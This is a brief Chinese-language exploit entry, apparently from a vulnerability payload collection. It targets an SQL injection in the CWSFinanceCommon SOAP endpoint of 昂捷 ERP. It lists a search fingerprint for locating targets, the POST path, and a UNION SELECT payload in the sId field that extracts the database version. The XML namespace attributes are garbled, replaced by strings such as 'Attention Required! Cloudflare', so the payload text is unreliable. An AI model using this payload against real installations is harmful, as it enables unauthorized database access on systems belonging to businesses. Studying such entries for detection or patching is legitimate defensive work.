# 昂捷ERPCWSFinanceCommon接口存在SQL注入

昂捷ERPCWSFinanceCommon接口 ｜ SQL注入 ｜ —
- **指纹**：`"昂捷ERP"`
- **请求**：`POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="Attention Required!  Cloudflare xmlns:xsd="Attention Required!  Cloudflare xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <GetOSpById xmlns="必应>
<sId>1' UNION SELECT NULL,NULL,NULL,NULL,(select
@@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
YQmj</sId>    </GetOSpById>
</soap:Body></soap:Envelope>
```